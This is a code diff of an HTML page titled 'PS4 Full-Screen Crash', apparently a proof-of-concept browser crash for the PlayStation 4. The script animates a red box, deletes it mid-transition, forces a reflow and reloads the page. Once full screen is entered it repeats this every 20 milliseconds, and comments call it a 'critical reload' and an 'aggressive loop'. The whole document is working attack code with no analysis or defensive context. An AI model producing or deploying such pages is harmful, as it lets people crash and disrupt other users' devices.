@@ -1,18 +1,46 @@
 <!DOCTYPE html>
 <html>
-<script>
-// All-in-one version that matches your working example
-const box = document.createElement('div');
-box.style = `width:100px;height:100px;background:red;transition:all 1s`;
-document.body.appendChild(box);
-
-getComputedStyle(box).transform;
-box.style.transform = 'translateX(100px)';
-
-setTimeout(() => {
-  box.remove();
-  void document.body.offsetHeight; // Force layout
-  location.href = "?crash"; // Critical reload
-}, 50);
-</script>
+<head>
+  <title>PS4 Full-Screen Crash</title>
+  <style>
+    #box {
+      width: 100px;
+      height: 100px;
+      background: red;
+      transition: transform 0.05s linear; /* Faster transition */
+      position: absolute;
+      left: 0;
+      top: 50%;
+    }
+  </style>
+</head>
+<body style="background: #000; height: 200vh;">
+  <div id="box"></div>
+  
+  <script>
+    const box = document.getElementById('box');
+    
+    // Rapid transition loop
+    function triggerTransition() {
+      box.style.transform = 'translateX(0)';
+      setTimeout(() => {
+        box.style.transform = 'translateX(100px)';
+        box.remove();
+        document.body.offsetHeight; // Force reflow
+        location.href = "?crash=1"; // Fast reload
+      }, 10); // Ultra-short delay
+    }
+    
+    // Start when user enters full-screen
+    document.addEventListener('fullscreenchange', () => {
+      if (document.fullscreenElement) {
+        setInterval(triggerTransition, 20); // Aggressive loop
+      }
+    });
+    
+    // Initial setup
+    box.style.transform = 'translateX(0)';
+    document.body.click(); // Some browsers need interaction
+  </script>
+</body>
 </html>
